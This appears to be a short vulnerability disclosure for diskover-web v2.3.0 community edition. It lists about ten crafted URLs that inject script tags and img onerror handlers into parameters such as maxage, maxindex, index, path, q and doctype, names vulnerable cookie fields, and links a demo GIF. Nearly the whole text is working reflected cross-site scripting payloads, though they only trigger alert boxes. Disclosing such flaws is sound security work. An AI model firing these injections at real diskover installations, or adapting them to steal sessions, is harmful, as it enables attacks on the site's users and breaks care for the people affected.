
```diskover-web v2.3.0 community edition (ce)```

maxage

```http://172.17.0.1:8080/selectindices.php?maxage=1"><script>alert(2)<%2fscript>&namecontains=&reloadindices&refreshindices```

maxindex

```http://172.17.0.1:8080/selectindices.php?reloadindices=true&maxindex=1%22%3e%3cscript%3ealert(1)%3c%2fscript%3e```

maxindex

```http://172.17.0.1:8080/selectindices.php?reloadindices=true&maxindex=1"><script>alert(1)</script>```

index


```http://172.17.0.1:8080/selectindices.php?indices-table_length=10&index=diskover-my_index_name%22%3e%3cscript%3ealert(1)%3c%2fscript%3e```

```http://172.17.0.1:8080/d3_data_bar_mtime_searchresults.php?path=%2fdata<img src%3da onerror%3dalert(1)>&usecache=1```

```http://172.17.0.1:8080/d3_data_search.php?path=%2fdata<img src%3da onerror%3dalert(1)>&filter=1&time=0&use_count=0&show_files=0&usecache=1```

```http://172.17.0.1:8080/search.php?index=diskover-my_index_name&submitted=true&p=1&q=size%3a<%3d52428800><script>alert(1)<%2fscript>&doctype=file```

```http://172.17.0.1:8080/search.php?index=diskover-my_index_name&submitted=true&p=1&q=size:<=52428800&doctype=file><script>alert(1)<%2fscript>```

```http://172.17.0.1:8080/view.php?id=kF7LTpYBiPlhI5qdCBHk&docindex=diskover-my_index_name&doctype="><script>alert(2)<%2fscript>```

```http://172.17.0.1:8080/view.php?id=kF7LTpYBiPlhI5qdCBHk&docindex=diskover-my_index_name%3cscript%3ealert(1)%3c%2fscript%3e&doctype=file```




Cookie

```
maxindex
index
```

Cookie JSON parameters

```
doctype 
file_size_bytes_low
file_size_bytes_high
last_mod_time_low
file_size_bytes_low 
```

Demo:
![](https://github.com/4rdr/proofs/blob/main/gifs/diskover-web_v2.3.0_community_edition_reflected_XSS_via_cookie.gif?raw=true)
